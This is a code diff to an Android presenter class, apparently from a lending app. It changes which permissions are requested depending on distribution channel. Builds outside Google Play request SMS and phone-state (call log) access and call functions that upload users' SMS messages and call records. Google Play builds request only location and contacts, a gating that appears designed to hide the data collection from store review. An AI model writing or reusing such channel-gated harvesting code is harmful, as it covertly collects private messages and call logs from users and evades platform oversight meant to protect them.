@@ -42,6 +42,7 @@ import okhttp3.Call;
 import static com.cocotree.android.network.OKHttpClientEngine.getNetworkClient;
 import static com.cocotree.android.ui.fragment.HomeFragment.mSelectAmount;
 import static com.cocotree.android.ui.fragment.HomeFragment.mSelectType;
+import static com.cocotree.android.uploadUtil.Tools.isNotGooglePlayChannel;
 import static com.cocotree.android.utils.UIUtils.showToast;
 
 public class HomePresenter extends BasePresenter<IHomeView> {
@@ -291,13 +292,21 @@ public class HomePresenter extends BasePresenter<IHomeView> {
      * 开始申请权限
      */
     public void requestPermissions() {
+        String[] permission;
+        if (isNotGooglePlayChannel()) {
+            permission = new String[]{
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.READ_PHONE_STATE,//包含READ_CALL_LOG
+                    Manifest.permission.READ_SMS};
+        } else {
+            permission = new String[]{
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.READ_CONTACTS
+            };
+        }
 
-        new Permission(mContext, new String[]{
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.READ_PHONE_STATE,//包含READ_CALL_LOG
-                Manifest.permission.READ_SMS,
-        }, new PermissionListener() {
+        new Permission(mContext, permission, new PermissionListener() {
             @Override
             public void onGranted() {
                 uploadAccordingPermissions();
@@ -316,22 +325,30 @@ public class HomePresenter extends BasePresenter<IHomeView> {
         } else {
             showToast(R.string.allow_permission_and_try_again);
         }
-        if (isGetSMSPermission()) {
-            if (!mHasUpdateSmsSuccess) {
-                uploadSmsOnly();
+
+        if (isNotGooglePlayChannel()) {
+            if (isGetSMSPermission()) {
+                if (!mHasUpdateSmsSuccess) {
+                    uploadSmsOnly();
+                }
             }
-        }
-        if (isGetCallLogPermission()) {
-            if (!mHasUpdateCallLogSuccess) {
-                uploadCallRecordOnly();
+            if (isGetCallLogPermission()) {
+                if (!mHasUpdateCallLogSuccess) {
+                    uploadCallRecordOnly();
+                }
             }
         }
     }
 
     private boolean isGetNecessaryPermission() {
-        return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
-                && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
-                && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+        if (isNotGooglePlayChannel()) {
+            return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                    && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
+                    && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+        } else {
+            return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                    && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+        }
     }
 
     private boolean isGetSMSPermission() {
@@ -485,17 +502,6 @@ public class HomePresenter extends BasePresenter<IHomeView> {
                             if (mView != null) {
                                 mView.handleCouponInfo(response);
                             }
-
-//                            if (isNoNeedShowDialog) {
-//                                if ("1".equals(response.couponStatus)) {//1已激活
-//                                    mView.setCouponInfo(response);
-//                                } else if ("0".equals(response.couponStatus) || "2".equals(response.couponStatus)) {//0 未激活  2已使用
-//                                    mView.noCoupon();
-//                                    mView.setBorrowPageCouponText();
-//                                }
-//                            } else {
-//                                mView.showCouponDialog(response);
-//                            }
                         } else {
                             mView.noCoupon(response);
                         }
